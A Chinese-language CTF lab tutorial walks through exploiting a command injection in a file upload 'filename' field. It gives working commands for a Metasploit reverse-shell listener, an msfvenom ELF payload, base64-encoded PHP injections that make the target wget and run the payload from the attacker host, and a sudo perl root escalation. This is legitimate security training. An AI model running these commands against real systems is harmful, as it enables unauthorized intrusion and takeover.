# 网络安全CTF：P18：命令注入漏洞利用实战 🚩

在本节课中，我们将学习如何利用上节课发现的命令注入漏洞，通过一系列步骤获取靶场机器的控制权，并最终取得Flag值。整个过程包括准备反弹Shell、生成恶意文件、绕过防火墙下载执行、提升权限等关键环节。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_1.png)

---

## 准备工作：启动监听与生成Shell

![](img/ebe88a3637f5ca402ffdb1698e8efe13_3.png)

上一节我们介绍了如何发现并验证命令注入漏洞。本节中，我们来看看如何利用该漏洞获取靶场机器的访问权限。首先，我们需要在攻击机上准备接收反弹Shell的环境。

**第一步是启动Metasploit监听器**。Metasploit是一个集成了渗透测试几乎所有工具的安全框架，可以系统性地完成漏洞利用任务。

在攻击机终端中执行以下命令：
```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.106  # 攻击机IP地址
set LPORT 4444
exploit
```
执行后，Metasploit开始在4444端口监听来自靶机的连接。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_5.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_7.png)

**第二步是生成一个Linux可执行的反弹Shell文件**。我们使用`msfvenom`工具来生成。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_9.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_11.png)

在另一个终端中执行：
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=4444 -f elf > /var/www/html/shell
```
这条命令会在Apache服务器的根目录（`/var/www/html/`）下生成一个名为`shell`的ELF格式可执行文件。我们需要启动Apache服务以便靶机下载。
```bash
service apache2 start
```

![](img/ebe88a3637f5ca402ffdb1698e8efe13_13.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_15.png)

---

![](img/ebe88a3637f5ca402ffdb1698e8efe13_17.png)

## 利用漏洞：让靶机下载并执行Shell

现在，我们需要让存在漏洞的靶场机器执行命令，从我们的攻击机下载这个`shell`文件并运行它。由于靶场可能设有防火墙，我们使用Base64编码命令来绕过检测。

以下是需要让靶机顺序执行的三条命令，我们将分别对它们进行Base64编码。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_19.png)

**第一条命令：下载文件**
```bash
echo "wget http://192.168.1.106/shell -O /tmp/a" | base64
```
编码后的命令用于让靶机从攻击机下载`shell`文件，并保存为`/tmp/a`。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_21.png)

**第二条命令：赋予执行权限**
```bash
echo "chmod 777 /tmp/a" | base64
```
编码后的命令用于给下载的文件赋予最高执行权限（777）。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_23.png)

**第三条命令：执行文件**
```bash
echo "/tmp/a" | base64
```
编码后的命令用于运行我们下载的恶意程序，从而建立反弹Shell连接。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_25.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_27.png)

---

![](img/ebe88a3637f5ca402ffdb1698e8efe13_29.png)

## 注入执行：通过Burp Suite发送恶意请求

![](img/ebe88a3637f5ca402ffdb1698e8efe13_31.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_33.png)

我们将利用上节课发现的文件上传参数`filename`的命令注入点，通过Burp Suite拦截并修改HTTP请求，依次发送上述三条Base64编码后的命令。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_35.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_36.png)

1.  **配置Burp Suite代理**，拦截浏览器上传文件的请求。
2.  将拦截到的数据包发送到Repeater模块进行修改。
3.  在`filename`参数中注入PHP代码来执行系统命令。格式为：`filename="test.php; system(base64_decode(‘编码后的命令‘)); ?>.png"`
4.  在Repeater中，依次将三条Base64编码后的命令替换到上述格式中，并发送请求。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_38.png)

**关键注入代码格式示例**：
```php
test.php; system(base64_decode('d2dldCBodHRwOi8vMTkyLjE2OC4xLjEwNi9zaGVsbCAtTyAvdG1wL2EK')); ?>.png
```
每发送一条请求，就相当于在靶机上执行了对应的命令。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_40.png)

当第三条命令（执行`/tmp/a`）成功发送后，观察之前启动的Metasploit监听窗口，应该会看到成功建立了`meterpreter`会话，这表示我们已经获得了靶机的一个初始Shell。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_42.png)

---

![](img/ebe88a3637f5ca402ffdb1698e8efe13_44.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_46.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_48.png)

## 权限提升：从普通用户到Root

![](img/ebe88a3637f5ca402ffdb1698e8efe13_50.png)

获得初始Shell后，我们通常不是最高权限用户。我们需要进行权限提升。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_52.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_54.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_56.png)

1.  在`meterpreter`会话中，输入`shell`命令进入系统Shell。
2.  使用`id`命令查看当前用户权限，确认不是root。
3.  使用`sudo -l`命令查看当前用户允许以root身份执行哪些命令。
4.  根据`sudo -l`的输出，寻找可以利用的程序。在本例中，发现用户可以无密码以root身份运行`/usr/bin/perl`。
5.  利用此配置，执行以下命令来启动一个具有root权限的Bash Shell：
    ```bash
    sudo perl -e ‘exec “/bin/sh”‘
    ```
    然后输入`bash -i`启动交互式Shell。看到命令提示符变为`#`，即表示获得了root权限。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_58.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_60.png)

---

![](img/ebe88a3637f5ca402ffdb1698e8efe13_62.png)

## 获取Flag：最终目标

![](img/ebe88a3637f5ca402ffdb1698e8efe13_64.png)

在取得root权限后，最后一步就是寻找并读取Flag文件。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_66.png)

1.  切换到根目录：`cd /root`
2.  列出文件：`ls`
3.  通常Flag文件名为`flag.txt`或类似，使用`cat`命令读取其内容：
    ```bash
    cat flag.txt
    ```
    屏幕上显示的内容就是本次CTF挑战的Flag值。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_68.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_70.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_72.png)

---

![](img/ebe88a3637f5ca402ffdb1698e8efe13_74.png)

## 课程总结 📝

![](img/ebe88a3637f5ca402ffdb1698e8efe13_76.png)

![](img/ebe88a3637f5ca402ffdb1698e8efe13_78.png)

本节课中我们一起学习了完整的命令注入漏洞利用流程：

![](img/ebe88a3637f5ca402ffdb1698e8efe13_80.png)

1.  **信息收集与漏洞确认**：利用工具或公开资源确认漏洞存在。
2.  **攻击准备**：在攻击机设置监听器（Metasploit）并生成恶意负载（msfvenom）。
3.  **漏洞利用**：通过命令注入点，让靶机下载、授权并执行恶意文件，从而建立反弹Shell。
4.  **权限提升**：利用系统配置缺陷（如sudo权限配置不当）将普通用户权限提升至root。
5.  **获取Flag**：在获得最高权限后，定位并读取目标文件。

![](img/ebe88a3637f5ca402ffdb1698e8efe13_82.png)

核心要点在于：进行渗透测试时，应充分收集信息，优先尝试利用已知的公开漏洞利用代码（EXP）。对于Web系统，如果存在现成的利用方式，就不必耗费精力挖掘零日漏洞。掌握系统性的工具使用和清晰的攻击思路是CTF比赛和实际安全评估中的关键。